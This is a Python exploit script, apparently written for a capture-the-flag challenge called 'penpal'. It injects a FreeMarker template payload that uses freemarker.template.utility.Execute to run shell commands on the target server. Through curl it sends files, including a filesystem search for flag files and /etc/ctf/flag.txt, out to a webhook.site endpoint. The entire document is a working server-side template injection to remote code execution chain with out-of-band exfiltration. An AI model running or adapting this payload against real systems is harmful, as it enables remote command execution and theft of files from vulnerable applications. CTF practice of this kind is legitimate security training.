#!/usr/bin/env python3
import argparse
import sys
import time
import urllib.parse

import requests


def send_freemarker_exec(target_url: str, command: str, timeout: int = 30) -> requests.Response:
    payload = '${"freemarker.template.utility.Execute"?new()("' + command + '")}'
    body = {
        "subject": "hello",
        "body": payload,
    }
    return requests.post(f"{target_url}/send", json=body, timeout=timeout)


def poll_webhook(token: str, per_page: int = 100) -> dict:
    url = f"https://webhook.site/token/{token}/requests?sorting=newest&per_page={per_page}"
    r = requests.get(url, headers={"Accept": "application/json"}, timeout=30)
    r.raise_for_status()
    return r.json()


def get_latest_by_src(token: str, src: str, retries: int = 12, sleep_sec: float = 1.0):
    for _ in range(retries):
        data = poll_webhook(token)
        for item in data.get("data", []):
            query = item.get("query", {})
            if isinstance(query, dict) and query.get("src") == src:
                return item
        time.sleep(sleep_sec)
    return None


def exfil_file(target_url: str, token: str, path: str, src_tag: str):
    cmd = f"curl -sS -X POST https://webhook.site/{token}?src={src_tag} --data-binary @{path}"
    r = send_freemarker_exec(target_url, cmd)
    r.raise_for_status()
    item = get_latest_by_src(token, src_tag)
    if not item:
        raise RuntimeError(f"No callback received for src={src_tag}")
    return item.get("content", "")


def main():
    parser = argparse.ArgumentParser(description="Exploit FreeMarker SSTI in penpal challenge")
    parser.add_argument("--target", default="https://penpal.squ1rrel.dev", help="Base URL target")
    parser.add_argument("--token", required=True, help="Webhook.site token UUID")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    token = args.token.strip()

    print("[+] Step 1: test outbound callback")
    ping_src = "pingtest"
    ping_cmd = f"curl -sS https://webhook.site/{token}?src={ping_src}&ok=1"
    send_freemarker_exec(target, ping_cmd).raise_for_status()
    ping = get_latest_by_src(token, ping_src)
    if not ping:
        raise RuntimeError("Outbound callback test failed")
    print("[+] Outbound callback OK")

    print("[+] Step 2: enumerate possible flag paths")
    find_cmd = "find / -maxdepth 6 -iname *flag* -fprint /tmp/found.txt"
    send_freemarker_exec(target, find_cmd, timeout=50).raise_for_status()
    found = exfil_file(target, token, "/tmp/found.txt", "foundtxt")
    print("[+] find output:")
    print(found.strip() or "(empty)")

    candidate = "/etc/ctf/flag.txt"
    print(f"[+] Step 3: exfil flag from {candidate}")
    flag = exfil_file(target, token, candidate, "realflag").strip()

    if not flag:
        raise RuntimeError("Flag content is empty")

    print(f"\n<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] Error: {exc}", file=sys.stderr)
        sys.exit(1)
